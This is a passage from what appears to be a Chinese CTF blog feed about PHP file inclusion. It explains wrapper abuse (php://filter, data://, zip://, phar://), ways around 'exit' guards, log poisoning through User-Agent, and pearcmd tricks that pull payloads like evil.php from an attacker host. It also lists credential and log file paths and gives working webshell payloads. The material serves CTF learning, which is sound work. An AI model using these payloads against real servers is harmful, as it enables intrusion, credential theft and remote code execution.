title="文件包含漏洞分类"></a>文件包含漏洞分类</h4><ol><li>本地文件包含</li><li>远程文件包含</li></ol><p>两个配置文件<br>allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件<br>allow_url_include：为ON时，就可使用include和require等方式包含远程文件</p><h4 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h4><p>Windows系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini      #查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml   #IIS配置文件</span><br><span class="line">c:\windows\repair\sam       #存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini   #MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD  #MySQL root密码</span><br><span class="line">c:\windows\php.ini                         #php配置信息</span><br></pre></td></tr></table></figure><p>Linux&#x2F;Unix系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd # 账户信息</span><br><span class="line">/etc/shadow # 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf # Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf # 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini # PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf # Apache配置文件</span><br><span class="line">/etc/my.conf # mysql 配置文件</span><br></pre></td></tr></table></figure><p><strong>常见协议</strong></p><p>file:&#x2F;&#x2F; — 访问本地文件系统</p><p>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</p><p>zlib:&#x2F;&#x2F; — 压缩流</p><p>data:&#x2F;&#x2F; — 数据（RFC 2397）</p><p>phar:&#x2F;&#x2F; — PHP 归档</p><h4 id="常见利用方式"><a href="#常见利用方式" class="headerlink" title="常见利用方式"></a><strong>常见利用方式</strong></h4><h5 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a><strong>php:&#x2F;&#x2F;</strong></h5><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.-encode&#x2F;resource&#x3D;index.php (常用于读取源码)</p><p>php:&#x2F;&#x2F;input  (配合post发送数据)</p><h5 id="谈一谈php-x2F-x2F-filter的妙用"><a href="#谈一谈php-x2F-x2F-filter的妙用" class="headerlink" title="谈一谈php:&#x2F;&#x2F;filter的妙用"></a><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=php://input</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/0c01ae826c0d7766a2b34be6f701e5b30e9601fd.png" alt="img"></p><h6 id="base64绕过死亡-die-x2F-exit"><a href="#base64绕过死亡-die-x2F-exit" class="headerlink" title="base64绕过死亡 die &#x2F; exit"></a>base64绕过死亡 die &#x2F; exit</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将 <code>$content</code> 解码，利用 php base64_decode 函数特性去除  “ 死亡exit ”</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符 &lt;  ?  ;  &gt;  空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有 phpexit 和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>最后效果是 ：</p><p><img src="https://i0.hdslb.com/bfs/album/4f2b1fd75551279202a950879223b9ddf113b8a1.png" alt="img"></p><p>对<code>&lt;?php system(&#39;tac *.php&#39;);?&gt;</code>进行base64编码</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<br>但是这里的&#x3D;被过滤</p><p>可以在前面的基础上加一点东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac *.php&#x27;);?&gt;aa</span><br><span class="line">//base64: PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTs/PmFh</span><br></pre></td></tr></table></figure><h6 id="字符串操作方法绕过死亡die-x2F-exit"><a href="#字符串操作方法绕过死亡die-x2F-exit" class="headerlink" title="字符串操作方法绕过死亡die&#x2F;exit"></a>字符串操作方法绕过死亡die&#x2F;exit</h6><p>这个<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/1e1b22bf37b0c4a4177438ab641852a101c5a142.png" alt="img"></p><p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。</p><p>“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终的数据包如下：</p><p><img src="https://i0.hdslb.com/bfs/album/8536923f147b0e59bd85bc5956728f2bf7fa8818.png" alt="img"></p><h6 id="rot13编码绕过死亡die-x2F-exit"><a href="#rot13编码绕过死亡die-x2F-exit" class="headerlink" title="rot13编码绕过死亡die&#x2F;exit"></a><strong>rot13编码绕过死亡die&#x2F;exit</strong></h6><p><code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p><p><img src="https://i0.hdslb.com/bfs/album/3d19b0ffad0c3d8c672de429bb97dcfab807fc49.png" alt="img"></p><h6 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv"></a><strong>convert.iconv</strong></h6><p>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。</p><h6 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h6><ol><li>usc-2 两位一反转(字符数量需为偶数)</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.ph</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//0b6cbb09-4547-46d7-9710-0154c8e14b60.challenge.ctf.show/?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php</span></span><br><span class="line">contents=?&lt;hp pe@<span class="title function_ invoke__">av</span>(l_<span class="variable">$EG</span>[T]x;)&gt;?</span><br></pre></td></tr></table></figure><ol><li>usc-4 四位一反转(字符数量需为4的倍数)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_<span class="variable">$s</span>[TS]pm1&gt;?;)/resource=s1mple.php</span><br></pre></td></tr></table></figure><ol><li>utf-8与utf-7之间的转化</li></ol><p>纯字符进行utf之间的转换后还是其本身，故可直接混淆死亡代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</span><br></pre></td></tr></table></figure><h5 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a><strong>data:&#x2F;&#x2F;</strong></h5><ul><li><strong>条件</strong>：<ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain; , 编码的payload</span><br><span class="line">index.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h5><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><p>zip:&#x2F;&#x2F;中只能传入绝对路径。<br>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型的还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;<br><img src="https://i0.hdslb.com/bfs/album/7f50178c0c8206ef565ea3fc3685429c47aa3e1f.png" alt="img"></p><h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><strong>file:&#x2F;&#x2F;</strong></h5><p>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</p><p>file:&#x2F;&#x2F;d:&#x2F;flag.txt</p><h5 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h5><p>phar:&#x2F;&#x2F;中相对路径和绝对路径都可以使用</p><p><img src="https://i0.hdslb.com/bfs/album/1c567d0f2f7d126f8f55440ffc8fbeacc93ede87.png" alt="img"></p><p>phar:&#x2F;&#x2F;[压缩文件路径]#[压缩文件内的子文件名]</p><p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg</p><p>index.php?file&#x3D;phar:&#x2F;&#x2F;1.jpg&#x2F;1.php</p><p>或 绝对路径</p><p>index.php?file&#x3D;phar:&#x2F;&#x2F;D:&#x2F;1.jpg&#x2F;1.php</p><h4 id="CTF-PHP代码审计中file-put-contents函数利用"><a href="#CTF-PHP代码审计中file-put-contents函数利用" class="headerlink" title="CTF PHP代码审计中file_put_contents函数利用"></a>CTF PHP代码审计中file_put_contents函数利用</h4><p>通过file_put_contents写入文件<br>难点在于。要写一个webshell。但字符只能a-zA-Z0-9_，而webshell至少需要  <strong>&lt;?</strong></p><p>看file_put_contens的文档即可发现，函数第二个允许传入数组，将被连接为字符串再写入<br>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content[]=&lt;?php&amp;content[]=%0aphpinfo();</span><br><span class="line">file_put_contens($filename,$content)</span><br></pre></td></tr></table></figure><p>此时，$content为&lt;?php phpinfo(); 传入的数组刚好绕过了正则检测<br><img src="https://i0.hdslb.com/bfs/album/84acfc21a4977434ff8a826540bbc2168935b044.png" alt="img"></p><p><strong>最后补一句，其实这个漏洞在fopen(),fwrite(), fclose()也是存在的</strong></p><h4 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h4><p><strong>fuzz日志文件</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/access_log</span><br><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/error_log</span><br><span class="line">/var/log/httpd/access.log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/httpd/error.log</span><br><span class="line">/var/log/httpd/error_log</span><br><span class="line">/var/log/access_log</span><br><span class="line">/var/log/access.log</span><br><span class="line">/var/log/error_log</span><br><span class="line">/var/log/error.log</span><br><span class="line">/var/log/apache/access_log</span><br><span class="line">/var/log/apache2/access_log</span><br><span class="line">/var/log/apache/error_log</span><br><span class="line">/var/log/apache2/error_log</span><br><span class="line">/usr/local/apache/log</span><br><span class="line">/usr/local/apache/logs</span><br><span class="line">/usr/local/apache/logs/access.log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/usr/local/apache/logs/error.log</span><br><span class="line">/usr/local/apache/logs/error_log</span><br><span class="line">/usr/local/apache2/logs/access.log</span><br><span class="line">/usr/local/apache2/logs/access_log</span><br><span class="line">/usr/local/apache2/logs/error.log</span><br><span class="line">/usr/local/apache2/logs/error_log</span><br><span class="line">/etc/httpd/logs/acces.log</span><br><span class="line">/etc/httpd/logs/acces_log</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br></pre></td></tr></table></figure><h4 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h4><p><code>register_argc_argv</code>为<code>On</code>，其中php-apache的docker环境默认满足</p><p><strong>方法一：</strong>直接写文件</p><p>注意这里需要在burp中发包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?+config-create+/&amp;f=/usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br><span class="line">GET /?+config-create+/&amp;f=/usr/local/lib/php/peclcmd&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>再包含写入的文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=/tmp/hello</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong>拉取远程文件</p><ul><li><p>web目录</p><p>拉取到web目录</p></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?f=pearcmd&amp;+install+-R+/var/www/html+http://vps/evil.php</span><br><span class="line">访问</span><br><span class="line">http://xxxx/tmp/pear/download/evil.php</span><br></pre></td></tr></table></figure><ul><li>tmp目录</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">访问</span><br><span class="line">http://ip:port/index.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></figure><p>限制</p><p><code>apt install php</code>方式安装的php默认<code>register_argc_argv</code>是关闭的</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@bf3ffaa74403:/usr/local/lib/php# php pearcmd.php </span><br><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br><span class="line">Usage: pear [options] command [command-options] &lt;parameters&gt;</span><br><span class="line">Type &quot;pear help options&quot; to list all options.</span><br><span class="line">Type &quot;pear help shortcuts&quot; to list all command shortcuts.</span><br><span class="line">Type &quot;pear help version&quot; or &quot;pear version&quot; to list version information.</span><br><span class="line">Type &quot;pear help &lt;command&gt;&quot; to get the help for the specified command.</span><br></pre></td></tr></table></figure><p><strong>jan神出的一道题</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>])&lt;<span class="number">100</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;想啥呢&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=/usr/local/lib/ph%70/pearcmd&amp;+install+-R+/tmp+http://ctf.jan.show/1.zip</span><br><span class="line">?f=phar:///var/www/html/tmp/pear/download/1.zip/1</span><br></pre></td></tr></table></figure><h4 id="ctfshow文件包含"><a href="#ctfshow文件包含" class="headerlink" title="ctfshow文件包含"></a>ctfshow文件包含</h4><h5 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h5><h6 id="日志文件包含-User-Agent头部注入命令"><a href="#日志文件包含-User-Agent头部注入命令" class="headerlink" title="日志文件包含(User-Agent头部注入命令)"></a>日志文件包含(User-Agent头部注入命令)</h6><p><strong>远程文件包含</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换了php和data</p><p>这里可以进行<strong>日志包含</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">日志文件记录了服务器收到的每一次请求的IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</span><br><span class="line"></span><br><span class="line">访问日志的位置和文件名在不同的系统上会有所差异</span><br><span class="line">apache一般是/var/log/apache/access.log</span><br><span class="line">apache2一般是/var/log/apache2/access.log</span><br><span class="line">nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><p>通过User-Agent头部注入命令：</p><p><img src="https://i0.hdslb.com/bfs/album/853df61736c23202ea3a4dfdb6b6e2ad295a3745.png" alt="img"></p><p>然后将日志包含进去，并通过POST参数执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/cea66ce551617d2d92b9e8649390cff6f3a9d85a.png" alt="img"></p><p>法二：</p><h6 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h6><p>往VPS下面写php代码，然后远程包含：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http:<span class="comment">//*.*.*.*/1</span></span><br></pre></td></tr></table></figure><p>法三:</p><p><strong>大小写绕过</strong></p><p><img src="https://i0.hdslb.com/bfs/album/ca607f28b353fac0d0922ecf78900fe558e2d3e7.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP带有很多内置URL风格的封装协议,可用于类似fopen()、copy()、file_exists() 和 filesize()的文件系统函数。当遇到文件包含时,我们可以这个特性来完成我们需要的指令。&lt;/p&gt;
&lt;h4 id=&quot;常见文件包含函数&quot;&gt;&lt;a href=&quot;#常见</summary>
      
    
    
    
    <category term="CTF" scheme="https://micgo.top/categories/CTF/"/>
    
    
    <category term="文件包含" scheme="https://micgo.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>linux提权</title>
    <link href="https://micgo.top/misc/linux%E6%8F%90%E6%9D%83/"/>
    <id>https://micgo.top/misc/linux%E6%8F%90%E6%9D%83/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2023-03-19T14:20:02.267Z</updated>
    
